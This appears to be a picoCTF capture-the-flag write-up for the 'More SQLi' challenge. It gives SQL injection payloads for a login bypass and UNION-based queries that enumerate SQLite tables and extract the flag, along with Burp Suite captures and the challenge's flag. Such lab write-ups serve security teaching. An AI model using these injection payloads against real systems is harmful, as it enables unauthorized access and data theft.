# picoGym Level 358: More SQLi
Source: https://play.picoctf.org/practice/challenge/358

## Goal
Can you find the flag on this website<br>
Try to find the flag here<br>
http://saturn.picoctf.net:57419/

## What I learned
```
username=admin&password=⚠️%27+OR+1%3D1%3B--

SQL Injection:
  ' OR 1=1;--
Identify Database (Note: 123 is dummy):
  123' UNION SELECT 1, sqlite_version(), 3;--
List Tables:
  123' UNION SELECT name, sql, null FROM sqlite_master;--
Retrieve Flag: Finally, to retrieve the flag, use the following query:
  123' UNION SELECT flag, null, null FROM more_table;--
```

## Solution
```
https://webshell.picoctf.org/

# View Source (No weakness seen yet)
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>picoCTF SQLi Security Challenge</title>
		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
	</head>

	<body>
	
		<div class="container">
			<form action="" method="post" class="form-login">
				<h1>Security Challenge</h1>
				<h3>Please log in</h2>
				<label for="inputUsername" class="sr-only">Username</label>
				<input type="text" name="username" id="inputUsername" class="form-control" placeholder="Username" required autofocus>
				<label for="inputPassword" class="sr-only">Password</label>
				<input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
				<button class="btn btn-lg btn-primary btn-block" type="submit">Log in</button>
			</form>
		</div>
	</body>
</html>

username: admin ⌨️
password: admin ⌨️
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'

username: admin ⌨️
password: ' OR 1=1 -- ⌨️

City	      Address	                      Phone
Algiers	    Birger Jarlsgatan 7, 4 tr	    +246 8-616 99 40
Bamako	    Friedrichstraße 68	          +249 173 329 6295
Nairobi	    Ferdinandstraße 35	          +254 703 039 810
Kampala	    Maybe all the tables 👀	     +256 720 7705600
Kigali	    8 Ganton Street	              +250 7469 214 950
Kinshasa	  Sternstraße 5	                +249 89 885 627 88
Lagos	Karl  Johans gate 23B, 4. etasje	  +234 224 25 150
Pretoria	  149 Rue Saint-Honoré	        +233 635 46 15 03

Search: 1337' UNION SELECT name, sql, null FROM sqlite_master;-- ⌨️
City	      Address	                      Phone
hints	      CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)	
more_table	CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)	
offices	    CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)	
sqlite_autoindex_users_1		
users	    CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)

Search: 1337' UNION SELECT flag, null, null FROM more_table;-- ⌨️
City	      Address	                      Phone
If you are here, you must have seen it		
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}	🔐

# Method 2: Burp Suite to anaylze redirect
Open Browser
Proxy: Intercept On
Browser:
  username: admin ⌨️
  password: ' OR 1=1;-- ⌨️
# Important: Don't Forward, Send to Repeater to see redirects ⚠️
HTTP/1.1 302 Found 👀
Host: saturn.picoctf.net:64969
Date: Fri, 22 Aug 2025 17:46:32 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.19
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: welcome.php
Content-type: text/html; charset=UTF-8

<pre>username: admin
password: ' OR 1=1;--
SQL query: SELECT id FROM users WHERE password = '' OR 1=1;--' AND username = 'admin'
</pre><h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p> 🔐
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>picoCTF SQLi Security Challenge</title>
		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
	</head>
	<body>
		<div class="container">
			<form action="" method="post" class="form-login">
				<h1>Security Challenge</h1>
				<h3>Please log in</h2>
				<label for="inputUsername" class="sr-only">Username</label>
				<input type="text" name="username" id="inputUsername" class="form-control" placeholder="Username" required autofocus>
				<label for="inputPassword" class="sr-only">Password</label>
				<input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
				<button class="btn btn-lg btn-primary btn-block" type="submit">Log in</button>
			</form>
		</div>
	</body>
</html>

# OPTIONAL: Follow Redirect would have result same as click Forward in Burp Suite
HTTP/1.1 200 OK
Host: saturn.picoctf.net:64969
Date: Fri, 22 Aug 2025 17:48:23 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.19
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>picoCTF SQLi Challenge</title>
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
	</head>

	<body>
		
		<div class="container">
			<h1>Welcome</h1>
			<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
			<h3>Search Office</h3> 
			<form method="post" action="" class="form-search">
				<div class="row">
					<div class="col-xs-12 col-sm-6 col-md-4">
						<div class="input-group">
							<input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus>
							<span class="input-group-btn">
								<input type="submit" name="submit" value="Search" class="btn btn-primary">
							</span>
						</div>
					</div>
				</div>
			</form>
			<div class="well col-xs-12 col-sm-6">
				<div class="table-responsive">
					<table class="table table-striped">
						<thead>
							<tr>
								<th>City</th>
								<th>Address</th>
								<th>Phone</th>
							</tr>
						</thead>
						<tbody>
						<tr><td>Algiers</td><td>Birger Jarlsgatan 7, 4 tr</td><td>+246 8-616 99 40</td></tr><tr><td>Bamako</td><td>Friedrichstraße 68</td><td>+249 173 329 6295</td></tr><tr><td>Nairobi</td><td>Ferdinandstraße 35</td><td>+254 703 039 810</td></tr><tr><td>Kampala</td><td>Maybe all the tables</td><td>+256 720 7705600</td></tr><tr><td>Kigali</td><td>8 Ganton Street</td><td>+250 7469 214 950</td></tr><tr><td>Kinshasa</td><td>Sternstraße 5</td><td>+249 89 885 627 88</td></tr><tr><td>Lagos</td><td>Karl Johans gate 23B, 4. etasje</td><td>+234 224 25 150</td></tr><tr><td>Pretoria</td><td>149 Rue Saint-Honoré</td><td>+233 635 46 15 03</td></tr>						</tbody>
					</table>
				</div>
			</div>
		</div>
	</body>
</html>
```

## Flag
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}

## Continue
[Continue](./picoGym0443.md)